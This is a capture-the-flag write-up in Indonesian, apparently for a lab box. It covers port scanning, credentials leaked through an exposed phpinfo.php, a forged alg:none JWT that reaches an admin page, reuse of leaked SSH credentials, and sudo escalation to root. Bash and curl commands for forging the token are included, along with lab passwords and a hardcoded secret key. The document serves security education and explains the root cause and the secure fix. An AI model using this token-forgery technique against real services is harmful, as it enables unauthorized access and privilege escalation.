|||
|---|---|
|**IP Target**|10.1.2.145|
|**OS**|Linux (Ubuntu)|
|**Difficulty**|Easy|
|**Kategori**|Web Exploitation|
|**Background**|"who am i?"|

---

## 1. Reconnaissance

### 1.1 Port Scanning

```bash
rustscan -a 10.1.2.145 --ulimit 1000 -r 1-65535 -- -A -sC -Pn
```

**Port terbuka:**

|Port|Service|Versi|
|---|---|---|
|22|SSH|OpenSSH 8.2p1 (Ubuntu Linux)|
|80|HTTP|Apache 2.4.41 (Ubuntu)|

Service HTTP redirect ke `/login.php`, menandakan aplikasi web memerlukan autentikasi.

### 1.2 Directory Enumeration

```bash
feroxbuster -u http://10.1.2.145/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -t 100 -k --dont-filter \
  -x html,php,txt \
  --filter-status 404,400 \
  --redirects -o 80.txt
```

**Temuan penting:**

|Status|Path|Keterangan|
|---|---|---|
|200|`/login.php`|Form login utama|
|200|`/atulieer.jpg`|Gambar profil/banner (196 KB)|
|200|`/secret.php`|Mengembalikan pesan `"You are not an admin. Go Away!!!"`|
|200|`/src/session.php`|Bisa diakses tapi response kosong (0 bytes)|
|200|`/phpinfo.php`|**Output `phpinfo()` lengkap ter-expose**|
|403|`/src/`, `/vendor/`|Directory listing diblokir, tapi file individual di dalamnya tetap bisa diakses|

Keberadaan `/secret.php` yang bisa dijangkau namun dibatasi aksesnya, mengindikasikan adanya mekanisme role-based access control yang perlu diselidiki lebih lanjut.

---

## 2. Information Disclosure via `phpinfo.php`

File `phpinfo.php` yang ter-expose adalah misconfiguration klasik yang bisa membocorkan informasi internal server. Output lengkap disimpan lalu di-grep untuk mencari field yang menarik:

```bash
curl -s http://10.1.2.145/phpinfo.php -o phpinfo_full.html
grep -A 30 "Environment</h2>" phpinfo_full.html
```

### 2.1 Konfigurasi yang relevan dengan keamanan

|Setting|Value|Dampak|
|---|---|---|
|`disable_functions`|Hanya fungsi `pcntl_*`|`exec`, `system`, `shell_exec`, `passthru` tetap bisa dipanggil|
|`open_basedir`|_(tidak ada nilai)_|Tidak ada pembatasan akses filesystem|
|`allow_url_include`|Off|Remote File Inclusion tidak bisa langsung dilakukan|
|`allow_url_fopen`|On|Remote read via wrapper masih memungkinkan|
|`file_uploads`|On (max 2M)|RCE via upload masih mungkin kalau ada fitur upload|

### 2.2 Credential yang bocor

Pada bagian **"Environment"** (environment variable custom, bukan default Apache/PHP), ditemukan:

```
Username: Charis
Password: 14m@we50m3
```

Ini contoh klasik kelalaian developer yang menyimpan credential di environment variable, yang akhirnya ikut ter-render oleh `phpinfo()`.

---

## 3. Akses Awal ke Web

Menggunakan credential yang bocor tadi ke form login:

```bash
curl -s -X POST http://10.1.2.145/login.php \
  -d "username=Charis&password=14m@we50m3" \
  -c cookies.txt
```

Login berhasil, redirect ke halaman untuk user **Charis**. Halaman menampilkan TODO list yang ternyata merupakan rangkaian hint yang disengaja:

```
✅ Make user panel
❌ Make admin panel
✅ Make sure the secret page only accessible by admin
❌ Do not forget to verify the signature for admin.
```

Poin terakhir pengingat yang belum tercentang soal **verifikasi signature untuk admin** sangat mengindikasikan adanya celah terkait JWT yang melindungi `/secret.php`.

---

## 4. Analisis JWT

Response login men-set cookie berikut:

```
Set-Cookie: D-JWT=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IkNoYXJpcyIsInJvbGUiOiJ1c2VyIiwicmVhbG0iOiJBdHVsaWVlciJ9.JxMtw-7yxRpETqJgZAWGpx11ujOKThcVKcJDnu_Yvvo
```

Setelah decode header dan payload (Base64URL):

**Header:**

json

```json
{"typ":"JWT","alg":"HS256"}
```

**Payload:**

json

```json
{"username":"Charis","role":"user","realm":"Atulieer"}
```

Claim `role: user` menjadi target utama untuk eskalasi ke `role: admin`. Karena token ditandatangani dengan HS256 dan secret key belum diketahui di tahap ini, forge signature secara langsung belum memungkinkan  sehingga teknik `alg: none` dicoba sebagai alternatif.

### 4.1 Serangan `alg: none`

Spesifikasi JWT secara teknis mengizinkan token tanpa tanda tangan (`alg: none`). Jika implementasi server mempercayai field `alg` dari token itu sendiri untuk menentukan perlu-tidaknya verifikasi signature, penyerang bisa saja mendeklarasikan `none` dan melewati proses signing sepenuhnya.

**Membuat token palsu:**

```bash
HEADER=$(echo -n '{"typ":"JWT","alg":"none"}' | base64 -w0 | tr -d '=' | tr '+/' '-_')
PAYLOAD=$(echo -n '{"username":"Charis","role":"admin","realm":"Atulieer"}' | base64 -w0 | tr -d '=' | tr '+/' '-_')
NEW_JWT="${HEADER}.${PAYLOAD}."

curl -v http://10.1.2.145/secret.php -H "Cookie: D-JWT=$NEW_JWT"
```

**Hasil:** `HTTP/1.1 200 OK` token admin palsu diterima, dan `/secret.php` mengembalikan konten yang seharusnya terproteksi:

```html
<h2>I bet no one would ever come here!!!</h2>
<h2>So I'll just put my SSH access here, just in case I forget.</h2>
...
<div class="box">berg:wann@Bep0r0r0</div>
```

Ini membocorkan set credential kedua  akses SSH sebagai user **berg**.

---

## 5. Root Cause (Source Code Review)

Setelah mendapat akses SSH, source code aplikasi ditinjau langsung di host pada `/var/www/html/src/session.php` untuk mengonfirmasi vulnerability secara pasti.

```php
public static function getAdminSession(): Session
{
    if ($_COOKIE['D-JWT']) {
        $jwt = $_COOKIE['D-JWT'];
        try {
            // Deliberately made insecure by not verifying the signature
            // Source: https://github.com/firebase/php-jwt/issues/68
            $tks = explode('.', $jwt);
            list($headb64, $bodyb64, $cryptob64) = $tks;
            $payload = JWT::jsonDecode(JWT::urlsafeB64Decode($bodyb64));

            if ($payload->role == 'admin' and $payload->username == 'Charis' and $payload->realm == 'Atulieer') {
                return new Session(['username' => $payload->username, 'role' => $payload->role]);
            } else {
                throw new Exception("User is not login");
            }
        } catch (Exception $exception) {
            throw new Exception("User is not login");
        }
    } else {
        throw new Exception("User is not login");
    }
}
```

### Analisis

Token di-split manual jadi tiga bagian (`explode('.', $jwt)`), tapi yang di-decode dan diperiksa hanya bagian **payload** (`$bodyb64`). Bagian **signature** (`$cryptob64`) diambil ke sebuah variable tapi **tidak pernah dipakai untuk verifikasi apapun**.

Artinya:

- Isi dari bagian signature sama sekali tidak relevan  bisa kosong, acak, atau sembarang.
- Field `alg` di header juga tidak pernah dicek.
- Payload apapun yang dikirim client, selama memenuhi `role == 'admin'`, `username == 'Charis'`, dan `realm == 'Atulieer'`, akan langsung dianggap valid.

Teknik `alg: none` berhasil di sini bukan karena server secara spesifik menghormati `alg: none`, melainkan karena **tidak ada verifikasi signature dalam bentuk apapun** yang dilakukan token palsu yang sama akan tetap berhasil meski header-nya `HS256` dengan signature asal-asalan.

### Perbandingan dengan implementasi secure yang seharusnya

File tersebut masih menyimpan referensi implementasi yang benar dalam bentuk komentar:

```php
// This is the original implementation (the secure one), as it verifies the signature
$payload = JWT::decode($jwt, new Key(SessionManager::$ADMIN_SECRET_KEY, 'HS256'));
```

Menggunakan `JWT::decode()` dengan `Key` object secara eksplisit akan:

1. Menghitung ulang HMAC signature dari header dan payload menggunakan secret key milik server.
2. Menolak token apapun yang signature-nya tidak cocok.
3. Menentukan algoritma di sisi server, mengabaikan nilai `alg` apapun yang dikirim client.

Ada juga secret key kedua di source code untuk session user standar:

```php
public static string $SECRET_KEY = 'DIyfeN#K@otTwGyVSUqcJKWwsp0PPZ7JnOE8zSg2oZpP9v$AAa0e25yXViPh8Cvfb^ep6HxOzV&p2^IO*U&jSx@yLSdpMPUFuF4';
```

Key ini mengatur `getCurrentSession()` (jalur user yang diverifikasi dengan benar) dan tidak diperlukan untuk rantai eksploitasi ini, tapi bisa dipakai untuk forge token **user** bersignature valid kalau dibutuhkan di endpoint lain.

---

## 6. Privilege Escalation

```bash
ssh berg@10.1.2.145
# Password: wann@Bep0r0r0
```

```bash
berg@atulieer:~$ sudo -l
```

```
Matching Defaults entries for berg on atulieer:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User berg may run the following commands on atulieer:
    (ALL : ALL) ALL
```

User `berg` memiliki hak akses `sudo` tanpa batasan:

```bash
berg@atulieer:~$ sudo su
root@atulieer:/home/berg#
```

Akses root berhasil didapat.